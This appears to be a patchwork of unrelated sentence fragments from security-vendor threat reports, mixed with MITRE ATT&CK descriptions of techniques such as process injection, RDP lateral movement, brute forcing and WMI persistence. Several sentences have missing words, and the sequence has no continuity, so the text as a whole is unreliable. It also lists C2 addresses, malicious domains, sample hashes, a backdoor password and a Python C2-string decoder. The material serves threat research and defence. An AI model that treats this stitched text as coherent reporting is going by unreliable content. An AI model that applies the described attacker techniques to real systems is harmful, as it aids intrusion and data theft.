McAfee detects these threats as:  RDN/Generic Exploit RDN/Generic.dx Generic PWS.y Generic.hbg Exploit-CVE2018-4878  McAfee customers are also covered by McAfee Global Threat Intelligence Web Reputation classification, which rate these URLs as High Risk
The database is located in the “/usr/lib/cva-ssys/My_BD” folder (“~/.local/cva-ssys/My_BD”—if the Trojan does not have root privileges)
The attacker leveraged multiple exploits, targeting both CVE-2014-6332 and CVE-2014-4113
CVE-2014-4113 is a privilege escalation vulnerability that was disclosed publicly on 2014-10-14
The first dropped file, doc.exe, contains the CVE-2014-4113 exploit and then attempts to execute test.exe with the elevated privileges
Are the attackers using any zero-day vulnerabilities? No zero-day vulnerabilities have been found in the analysis of the samples obtained regarding this campaign
These vulnerabilities were patched last December 28 2015, April 5, 2016, and May 12, 2016, respectively
Trend Micro Solutions Trend Micro™ Deep Security™ and Vulnerability Protection provide virtual patching that protects endpoints from threats such as malicious redirections to malware-hosting URLs, as well as those that exploit unpatched vulnerabilities
OfficeScan’s Vulnerability Protection shields endpoints from identified and unknown vulnerability exploits even before patches are even deployed. Trend Micro™ Deep Discovery™ provides detection, in-depth analysis, and proactive response to attacks using exploits and other similar threats through specialized engines, custom sandboxing, and seamless correlation across the entire attack lifecycle, allowing it to detect these attacks even without any engine or pattern update
Dubbed ‘SpeakUp’, the new Trojan exploits known vulnerabilities in six different Linux distributions
exploits a known Windows privilege escalation vulnerability ( ) on unpatched computers.
Among them, we found variations on the    EternalDarkness SMBv3 exploit (CVE-2020-0796)  , a , the privilege escalation exploit published on the Google Security Github account, and the privilege escalation exploit.
Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.

When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.

Adversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).
A 2016 Novetta report detailed the work of security vendors attempting to unveil tools and infrastructure related to the 2014 destructive attack against Sony Pictures Entertainment
Detecting Avast  A unique feature of this latest Astaroth Trojan campaign is the malware's ability to search for specific security products and exploit them
The analysis of the tools and techniques used in the Astaroth campaign show how truly effective LOLbins are at evading antivirus products
Tools CTU researchers observed BRONZE UNION using the following tools in intrusions since the 2015 analysis, but clients should assume that the threat group still has access to the previously reported tools
Organizations that Buckeye targeted over time, per region Malware and tools Buckeye uses a number of hacking tools as well as malware
In doing so, it will attempt to detect the following Anti-Virus products via various techniques:  Trend Micro Kaspersky Symantec Avira AVG ALYac Ahnlab  Ahnlab and ALYac are the most widely used Anti-Virus solutions in South Korea, and Trend Micro and the rest are also known to be most widely used in Taiwan
When combined with email tracking software, APT32 was able to closely track phishing delivery, success rate, and conduct further analysis about victim organizations while monitoring the interest of security firms
This group was observed using tactics such as registering typosquatting domains for security or technology vendors, abusing open-source penetration testing tools, and leveraging novel file types as anti-analysis techniques
APT12 closely monitors online media related to its tools and operations and reacts when its tools are publicly disclosed
Types of attacks possibly averted include Structured Query Language (SQL) injection, cross-site scripting, and command injection.Use stringent file reputation settings – Tune the file reputation systems of your anti-virus software to the most aggressive setting possible
Keep security software up-to-date with the latest definitions  Protection Norton Security, Symantec Endpoint Protection, and other Symantec security products protect users against these threats through the following detections: AV  Backdoor.Cadelspy Backdoor.Remexi Backdoor.Remexi.B  IPS  System Infected: Backdoor.Cadelspy Activity 2 System Infected: Backdoor.Remexi Activity  Indicators of compromise We have also compiled an indicators-of-compromise document containing further details which can be used to help identify the threats if they are present in your environment
We would like to thank White-Hat, Tom Lancaster of Palo Alto Networks, Michael Yip of Stroz Friedberg, security researcher Marcus, and other security researchers and organizations who shared information and provided feedback
In addition to obfuscation techniques, it also has the ability to detect security tools on the analysis machine, and can also shut down the system if it detects the presence of such tools
Checks for the presence of security tools (detailed in the Appendix) and if any of these security tools are discovered, then the system will be shut down, as shown in Figure 14
Figure 14: System shut down upon discovery of security tools  Ability to receive PowerShell script from the C2 server and execute on the machine
Additionally it checks to determine if common analysis tools are currently running on the infected system
Given the regional file format used there is a chance that some security software suites may not handle them well, and this may have provided an evasion case for the attacker.The documents sent to the targets were titled "Analysis of "Northern New Year in 2017" and used the official logo of the Korean Ministry of Unification
Smart, optimized, and connected, XGen security powers Trend Micro’s suite of security solutions: Hybrid Cloud Security, User Protection, and Network Defense
Link analysis of infrastructure and tools also revealed a potential relationship between Magic Hound and the adversary group called “Rocket Kitten” (AKA Operation Saffron Rose, Ajax Security Team, Operation Woolen-Goldfish) as well as an older attack campaign called Newscasters
As seen below, the relational analysis proved to be quite fruitful:  Figure 1 Overview of relationships We rapidly discovered a different set of tools communicating to the exact same C2 servers as those two Word documents, in addition to other tools communicating to other subdomain variations of chrome-up[.]date as seen in the following graphic:  Figure 2 Command and control overlaps From there, we were able to map out a large infrastructure separating out into four categories of tools: downloaders, droppers, loaders, and payloads
The toolset used by the Magic Hound campaign was an assortment of custom tools, as well as open sourced tools available to the general public
They are known for “living off the land,” meaning they use already available tools and software installed on the computer to operate, and once inside a target network, they will tailor their malware specifically to the target
Traditional antivirus software and other systems that rely on low-level indicators do not effectively detect and block common and pervasive malware
End users can benefit from security solutions such as Trend Micro Home Security for Mac, which provides comprehensive security and multi-device protection against cyberthreats
Enterprises can benefit from Trend Micro’s Smart Protection Suites with XGen security, which infuses high-fidelity machine learning into a blend of threat protection techniques to eliminate security gaps across any user activity and any endpoint
As we discover new tools used by this group, we have consistently discovered overlapping artifacts with previously used tools and infrastructure
Mitigation Security and system/IT administrators must practice due diligence in protecting their websites and web-based applications from threats that can undermine their security, and hijack them to do the bad guys’ bidding—delivering malware to their victims
Network Security appliances such as NGFW, NGIPS, and Meraki MX can detect malicious activity associated with this threat
AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products
Mitigation As this sample installs itself through the use of EternalBlue, the targeted protocol is SMB.  Because of this, in order to best mitigate and avoid possible installations, you need your system updated to the latest security patches.  Specifically, you’d want to make sure that you have MS17-010 installed, as this is the security patch that patches the EternalBlue vulnerability
The malware queries the value for the flag BeingDebugged from PEB to check whether the process is being debugged. 

Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.

Example commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.

Adversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment.(Citation: Expel IO Evil in AWS) For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the <code>DescribeSecurityGroups</code> action with various request parameters. (Citation: DescribeSecurityGroups - Amazon Elastic Compute Cloud)
APT38 is characterized by long planning, extended periods of access to compromised victim environments preceding any attempts to steal money, fluency across mixed operating system environments, the use of custom developed tools, and a constant effort to thwart investigations capped with a willingness to completely destroy compromised machines afterwards
The RIPTIDE exploit document drops its executable file into the C:\Documents and Settings\{user}\Application Data\Location folder while the HIGHTIDE exploit document drops its executable file into the C:\DOCUMENTS and SETTINGS\{user}\LOCAL SETTINGS\Temp\ folder
In many payment card data breaches, a point-of-sale (POS) system is infected with malware that searches for specific processes in memory known to store card data in plain text
Additionally, VALUEVAULT will call Windows PowerShell to extract browser history in order to match browser passwords with visited sites.
Custom tools such as REDTRIP, PINKTRIP, and BLUETRIP have also been used to create SOCKS5 proxies between infected hosts
[9] “HKU concern group raises proxy fears in key vote.” EIJ Insight
In green, functions from Keychaindump C&C communication Keydnap is using the onion.to Tor2Web proxy over HTTPS to report back to its C&C server
This can be complemented by restricting direct internet access to the company’s internal networks while using proxies to access external resources
Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.

Adversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.
In addition to using RDP for lateral movement, APT39 has used this protocol to maintain persistence in a victim environment
Lateral Movement APT40 uses many methods for lateral movement throughout an environment, including custom scripts, web shells, a variety of tunnelers, as well as Remote Desktop Protocol (RDP)
Containment provided by enclaving also makes incident cleanup significantly less costly.Configure firewalls to disallow Remote Desktop Protocol (RDP) traffic coming from outside of the network boundary, except for in specific configurations such as when tunneled through a secondary virtual private network (VPN) with lower privileges.Audit existing firewall rules and close all ports that are not explicitly needed for business

Following the compromise of this system, analysts identified FIN6 leveraged stolen credentials to move laterally within the environment using the Windows’ Remote Desktop Protocol (RDP).
FIN6 used another set of compromised credentials with membership to additional groups in the domain to RDP to other hosts
FIN6 also moved laterally to servers in the environment using RDP and configured them as malware “distribution” servers.
Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.

Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services) 

Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) or [Terminal Services DLL](https://attack.mitre.org/techniques/T1505/005) for Persistence.(Citation: Alperovitch Malware)
To complete its mission, APT39 typically archives stolen data with compression tools such as WinRAR or 7-Zip
APT40 has been observed consolidating files acquired from victim networks and using the archival tool rar.exe to compress and encrypt the data before exfiltration
This crafted zip archive exploited a WinRAR flaw that makes files in zip archives appear to have a different name and file extension
On September 24, 2018, we observed an organization targeted by OilRig attempting to download a Zip archive from the following URL: hxxp://193.111.152[.]13/[redacted]-ITsoftwareUpdate.zip This Zip archive contained a file named [redacted]-ITsoftwareUpdate.exe (SHA256: 5f42deb792d8d6f347c58ddbf634a673b3e870ed9977fdd88760e38088cd7336), which is a variant of the OopsIE Trojan we described in detail in a blog we published in September 2018
RARM Creates RAR files per logical drive containing data with timestamps for the past 30 days, then uploads RAR to the C2 server using a POST command at the path “/FeedBack.php”
RARW Creates RAR files per logical drive containing data with timestamps for the past 7 days, then uploads RAR to the C2 server using a POST command at the path “/FeedBack.php”
When exfiltrating the keychain, the keychain field is used instead of data
Each of the emails had a password protected RAR archive attached named credential.rar
Sometimes it is a high profile, legitimate site such as “diplomacy.pl”, hosting a ZIP archive
The ZIP archive contains a RAR SFX which installs the malware and shows an empty PDF decoy
The entire command structure gets compressed with zlib and then encrypted using a custom stream cipher.

The results are Gzipped and saved under random file in the temp folder.
An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.

Both compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.
Internal Reconnaissance APT40 uses compromised credentials to log on to other connected systems and conduct reconnaissance
Figure 4 – Backdoored authentication function in SSH server As you can see in Figure 4, this version of Dropbear SSH will authenticate the user if the password passDs5Bu9Te7 was entered
Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.

In an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet Remote Desktop Services)

Legitimate applications (such as [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) and other administrative programs) may utilize [Remote Services](https://attack.mitre.org/techniques/T1021) to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, including [VNC](https://attack.mitre.org/techniques/T1021/005) to send the screen and control buffers and [SSH](https://attack.mitre.org/techniques/T1021/004) for secure file transfer.(Citation: Remote Management MDM macOS)(Citation: Kickstart Apple Remote Desktop commands)(Citation: Apple Remote Desktop Admin Guide 3.3) Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement. In versions of macOS prior to 10.14, an adversary can escalate an SSH session to an ARD session which enables an adversary to accept TCC (Transparency, Consent, and Control) prompts without user interaction and gain access to data.(Citation: FireEye 2019 Apple Remote Desktop)(Citation: Lockboxx ARD 2019)(Citation: Kickstart Apple Remote Desktop commands)
APT40 also uses publicly available brute-forcing tools and a custom utility called DISHCLOTH to attack different protocols and services
During our initial research into the TwoFace++ loader, we were unable to extract the embedded payload using the same brute forcing technique that we used on the initial TwoFace loader samples
We were able to brute force the actor-provided key using the inverse arithmetic operations using the embedded salt and embedded ciphertext, so we were able to extract the embedded webshells with ease
It then takes note of the infected machine’s IP address, user, domain, hostname, OS and Service Pack, and the username and password combination that worked during the brute force routine
Its main functions are:  Brute-force using a pre-defined list of usernames and passwords in an attempt to login to Admin panels
TG-3390 attempts to reenter the environment by identifying accounts that do not require two-factor authentication for remote access solutions, and then brute forcing usernames and passwords
Several of the tools are freely-available Windows utilities, such as Amplia Security’s Windows Credential Editor. We also found a nearly complete set of the Microsoft SysInternals  PsTools package, a copy of NLBrute (which attempts to brute-force passwords), installers for the commercial TeamViewer and AnyDesk remote support tools, and a number of utilities created by endpoint security vendors that are designed to remove their (and other companies’) endpoint security and antivirus tools from a computer.
We found a brute-force tool called NLBrute , with configuration files that tell us it had been set up to use an included set of username and passwords to try to break in to machines that have Remote Desktop enabled
Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.

Brute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [Account Discovery](https://attack.mitre.org/techniques/T1087), or [Password Policy Discovery](https://attack.mitre.org/techniques/T1201). Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services](https://attack.mitre.org/techniques/T1133) as part of Initial Access.
Common TCP ports 80 and 443 are used to blend in with routine network traffic
Old Comnie Variant C2 Decoder      12345678910111213141516171819  import requestsimport sysimport redef decode(data):  o = ""  for c in data:    if c == "*":      o += "."    elif c == "|":      o += ":"    elif c == "+":      o += ";"    else:      o += chr(ord(c)-49)  return or = requests.get(sys.argv[1])fd = r.textdata = fd.split("++a++")[1].split("++a++")[0]print(decode(data))       Samples Analyzed eed5945c36ba22a2531dd2d9dd7bc4e17e68544d512be75670919caf287c1b4a 8026442b812469e48ccd11611ab6eacdcb312a8f1aabd563b7f4cb4868315e16 c8951038fd53321661274e5a12532c3fb6f73c75fd75503a1089c56990658fef 48a1ce103e5bf47c47cc5ed40b2dc687ebaf3674d667419287bcb1d0b8d8dda6 e06b797a24fa03a77e0d5f11b0cf0f4f038e0a9ea04d4981d39148969349c79c 7282d0709449abe16457864f58157cac8d007571dc5d463d393d1ae2605d17e0 bf6ee8426245b167a69292e513c0841d818b310dda87daea649221f4e0afd1b3 62b98dde60cb4dd0d0088bde222c5c2c4c92560cccf4753f1ce94e044093ab85 756952652290ad09fe03c8674d44eab2077b091398187c3abcb6f1ddc462c32d 639a49390c6f8597d36ec0bd245efa1b4a078c0506fb515e577a40389b39a614 29ed6eb3c882b018c2bb6bf2f8eb15069dc5510ca119abebf24f09e3c91f10aa 0e8a4e4d5ca501bad25a730fb5de534fa324c6ac23e0a573524693f2d996d105 316a0c6849f183a1a52d0c7648e722c4ca85bd57b0804a147c0c8656b84bbdb9   Identified C2s 121.126.211[.]94:8080 113.196.70[.]11:80,8080 133.130.101[.]47:443 123.51.208[.]157:443;8000;8080   C2 Hosting URLs (DDR URLs) github[.]com/korlee5643 itsmonsee.tumblr[.]com allworldnewsway.blogspot[.]com
Resulting script on the compromised government websites Users were redirected to https://google-updata[.]tk:443/hook.js, a BEeF instance, and https://windows-updata[.]tk:443/scanv1.8/i/?1, an empty ScanBox instance that answered a small piece of JavaScript code
PUPY LOADER The Pupy RAT comes packaged by default with loaders that can run the RAT on a variety of platforms such as Windows, macOS, Linux and Android
In addition, although the 2017 campaign has been documented, during our research regarding MirageFox, we found a recently uploaded binary (6/8/2018) from the 2017 campaign, pretty much identical to a RAT mentioned in their RoyalAPT report, barely detected with only 7/66 detections on VirusTotal.  APT15 Code Reuse We found the new version of the RAT on VirusTotal hunting, by a YARA signature we created based off code only found in Mirage and Reaver, both attributed to Chinese government affiliated groups
These files are then transmitted to a threat actor, often over commonly open ports 80 and 443 (HTTP and HTTPS)
Msoffice365cdn[.]com resolves to 80.82.79.221, which resides on the same class C network range as the IP resolution of office365-technical[.]info, which resolves to 80.82.79.240
SpyNote RAT builder The SpyNote Remote Access Trojan (RAT) builder is gaining popularity in the hacking community, so we decided to study its pervasiveness
KONNI is a RAT that is believed to have  been in use for over four years, with a wide array of functionalities, often leveraging free web hosting providers like 000webhost for its C2 infrastructure
Command and control To traverse the firewall, C2 traffic for most TG-3390 tools occurs over ports 53, 80, and 443
Upon first execution of TONEDEAF, FireEye identified a callback to the C2 server offlineearthquake[.]com over port 80.
The Metasploit reverse HTTP payload was configured to communicate with the command and control (C2) IP address 176.126.85[.]207 with a randomly named resource such as” over TCP port 443.

Adversaries may communicate using a protocol and port paring that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.
The malware proceeds to connect to the C2 server at 5.189.145.248 at regular intervals through the use of TCP over port 10500
1/12/14 3/5/14 127.0.0.1 N/A   3/5/14 3/31/14 103.24.0.142 Hong Kong   3/31/14 10/27/14 103.24.1.54 Hong Kong   10/27/14 11/9/14 127.0.0.1 N/A   11/9/14 5/25/15 127.0.0.3 N/A   5/25/15 Current as of this publication 127.0.0.1 N/A    Table 5
Adversaries may communicate using a protocol and port paring that are typically not associated. For example, HTTPS over port 8088(Citation: Symantec Elfin Mar 2019) or port 587(Citation: Fortinet Agent Tesla April 2018) as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.
This version injects a malicious module into one of Avast's processes, whereas early versions of the campaign detected Avast and quit
On execution, the tool injects itself into lsass.exe and is triggered with the argument “dig”
Figure 5 shows Phishery’s output to the command that injects a URL into a file named “good_test.docx”, which it will save the resulting file to “bad_test.docx”
It is capable of the following functions:  Collect file/folder/drive information Download files and additional malware Launch/terminate/enumerate process Update configuration data Delete files Inject code from files to other running process Utilize proxy Open reverse shell Run in passive mode — instead of actively connecting to the command and control (C&C) server, the backdoor will open and listen to a port then receive commands through it  Once the backdoor is loaded, it will then load the encrypted configuration file Auditcred.dll.mui/rOptimizer.dll.mui to extract the C&C information and connect to it
As a result of all these steps, the last-stage Trojan is injected into svchost.exe’s process memory
Process injection helps the malware avoid detection; however, review of active network connections show notepad.exe communicating to 185
This shellcode injects the final payload taken from the resource section into the original RegAsm.exe process
Traps 4.0 can be configured to protect the processes that are cited as being abused in this blog from loading malicious code
Injects ma32.dll into “wwahost.exe” or “audacity.exe”
05 27 28 obj32.bin obj32.bin obj64.bin Shellcode template is used by Reinstaller/Injector (rsXX.dll) and AudioRecorder4MetroApp (meXX.dll) for injecting into running processes
Pupy can communicate using multiple transports, migrate into processes using reflective injection, and load remote python code, python packages and python C-extensions from memory
Meanwhile, injection and delivery techniques are undergoing changes in 2018 with reflective loaders and code enhancements
2e0361fd73f60c76c69806205307ccac, update.dll (MiniDuke), 425kb (internal name = “UserCache.dll“) 9e3f3b5e9ece79102d257e8cf982e09e, cache.dll (CozyDuke), 425kb (internal name = “UserCache.dll“) The two share identical export function names in their export directories, and the naming appears to be randomly assigned at compile time
*Command_Create&Inject:  This command creates a new process (using a supplied filename as the process name) and then injects malicious code into it
64)   u= {B5B70BD7-87FC-499A-B4D1- 98163306F0D8} A GUID   r= 1 Boolean value if the malware is running as injected code   t= 8035187 Number of milliseconds the computer has been running    Table 3
The loader will then inject a DLL backdoor into dllhost.exe
FakeRun’s PDB string (D:\Work\Project\VS\house\Apple\Apple_20180115\Release\FakeRun.pdb) indicates the loader will execute dllhost.exe and inject one malicious DLL file, which is the backdoor, into this process
TClient is injected into dllhost.exe Malware Analysis  wab32res.dll (FakeRun loader) loads TClient
Successfully checking the loader will execute the dllhost.exe process and create a hardcode mutex to avoid injecting it into the wrong dllhost.exe, as there can be multiple instances of it depending on the number of programs using the Internet Information Services
20 New processes The malicious svchost constantly queries ieframe.dll, as well as IWebBrowser2 Interface using CLSID dc30c1661-cdaf-11D0-8A3E-00c04fc9e26e, both key components to interact with Internet Explorer
Figure 2: De-obfuscated code scheduling the second task to run a script embedded in a blog page The last section of script embedded in 29[.]html then downloads Revenge RAT and injects the binary into the memory of a running process, as seen in Figure 3
The encoded payload was a Cobalt Strike httpsstager that was injected into the PowerShell process that ran the command
After finding the process id, the shellcode uses standard functions to allocate and write memory within Explorer and then uses low-level API RtlCreateUserThread for thread injection.
It’s also used to inject code into its target processes using the technique.
Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. 

There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. 

More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. 
wmic.exe is a powerful, native Windows command line utility used to interact with Windows Management Instrumentation (WMI)
This utility is able to execute complicated WQL queries and WMI methods
Instead of using systeminfo and tasklist commands, the C# variant of Zebrocy uses WMI queries to gather this information
POSHSPY leverages two of the tools the group frequently uses: PowerShell and Windows Management Instrumentation (WMI)
POSHSPY's use of WMI to both store and persist the backdoor code makes it nearly invisible to anyone not familiar with the intricacies of WMI
Windows Management Instrumentation WMI is an administrative framework that is built into every version of Windows since 2000
WMI can be accessed using a variety of tools, including the Windows WMI Command-line (wmic.exe), or through APIs accessible to programming and scripting languages such as PowerShell
Windows system WMI data is stored in the WMI common information model (CIM) repository, which consists of several files in the System32\wbem\Repository directory
WMI classes are the primary structure within WMI
WMI permanent event subscriptions can be used to trigger actions when specified conditions are met
Subscriptions consist of three core WMI classes: a Filter, a Consumer, and a FilterToConsumerBinding
WMI Filters define conditions that will trigger a Consumer, including system startup, the execution of a program, the passing of a specified time and many others
APT29 then created a WMI event subscription in order to execute the backdoor
In one instance, APT29 created a Filter named BfeOnServiceStartTypeChange (Figure 1), which they configured to execute every Monday, Tuesday, Thursday, Friday, and Saturday at 11:33 am local time.     Figure 1: “BfeOnServiceStartTypeChange” WMI Query Language (WQL) filter condition The BfeOnServiceStartTypeChange Filter was bound to the CommandLineEventConsumer WindowsParentalControlsMigration
This excellent whitepaper by William Ballenthin, Matt Graeber and Claudiu Teodorescu contains additional information on WMI offense, defense and forensics
This presentation by Christopher Glyer and Devon Kerr contains additional information on attacker use of WMI in past Mandiant investigations
The FireEye FLARE team released a WMI repository-parsing tool that allows investigators to extract embedded data from the WMI repository and identify WMI persistence.
Initial triage begins with connecting to Windows Management Instrumentation (WMI) via the “ROOT\CIMV2” namespace
The payload uses WMI queries and checks running processes for evidence that the script may be executing within an analysis environment
Technique Description   Fan Check The Trojan will perform the following WMI query:   Select * from Win32_Fan   According to MSDN, this query should return a class that provides statistics on the CPU fan
This suggests that other WMI-based VM detection techniques may also detect certain physical systems if those systems do not support the specific WMI query
Perhaps they plan to pair this stealer with another dropper that maintains the WMI anti-AV functionality
Leveraging Existing Windows Services to Deliver Malware Windows Management Instrumentation Console (WMIC) provides a command line interface to WMI
WMIC is a good tool for managing windows hosts and is widely favored by desktop administrators
This is attack vector presents interesting problems, as blocking or restricting the use of WMIC may not be a feasible solution for some administrators
Most of the PowerShell commands would call Windows Management Instrumentation (WMI)
Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is an administration feature that provides a uniform environment to access Windows system components. The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) (WinRM).(Citation: MSDN WMI) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: MSDN WMI)(Citation: FireEye WMI 2015)

An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015)
This location data gives the attacker a unique edge, as they can specify a target country or city to attack and maximize their accuracy when choosing a particular target.    The .txt file contains information about the C2 domain and infected machine, as detected in a Cybereason Lab environment
Malware  Capabilities  WINDSHIELD   Command and control (C2) communications via TCP raw sockets Four configured C2s and six configured ports – randomly-chosen C2/port for communications Registry manipulation Get the current module's file name Gather system information including registry values, user name, computer name, and current code page File system interaction including directory creation, file deletion, reading, and writing files Load additional modules and execute code Terminate processes Anti-disassembly   KOMPROGO   Fully-featured backdoor capable of process, file, and registry management Creating a reverse shell File transfers Running WMI queries Retrieving information about the infected system   SOUNDBITE   C2 communications via DNS Process creation File upload Shell command execution File and directory enumeration/manipulation Window enumeration Registry manipulation System information gathering   PHOREAL   C2 communications via ICMP Reverse shell creation Filesystem manipulation Registry manipulation Process creation File upload   BEACON (Cobalt Strike)   Publicly available payload that can inject and execute arbitrary code into processes Impersonating the security context of users Importing Kerberos tickets Uploading and downloading files Executing shell commands Configured with malleable C2 profiles to blend in with normal network traffic Co-deployment and interoperability with Metasploit framework SMB Named Pipe in-memory backdoor payload that enables peer-to-peer C2 and pivoting over SMB    Table 3: APT32 Malware and Capabilities APT32 operators appear to be well-resourced and supported as they use a large set of domains and IP addresses as command and control infrastructure
The malware performs the following activities:  Builds imports by dynamically loading APIs Decrypts strings needed for control server communications Performs control server communications Handles commands issued by the control server Uninstalls self from the system  The malicious thread dynamically loads the APIs it needs at the beginning of its execution using LoadLibrary() and GetProcAddress()
In response, if the status is OK, then a TOKEN is received from the C2 server that is used to synchronize the activities between the victim’s machine and the C2 server
After obtaining the unique ID from the C2 server, the Trojan calls the “SetAbStatById” method to notify the C2 server of its status of “1” to notify the server it had successfully received the filename and file data
Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.
The r1.log file stores information for exfiltration
After Comnie has been copied to the %TEMP% directory, it will look for the presence of the ‘DQuit.tmp’ file in this path
FeedBack.php validates the sender by User-Agent, saves the data in the “RAR” server directory and stores the metadata in the mssql database for later reference
Log.php validates the sender by User-Agent, saves the data in the “UP” server directory and stores the metadata in the mssql database for later reference
Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.(Citation: PWC Cloud Hopper April 2017)

In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)

Adversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.
Note: aswrundll.exe is very similar to Microsoft’s own rundll32.exe - it allows you to execute DLLs by calling their exported functions
On the next step this file is executed by rundll32.exe via the KlpSvc export
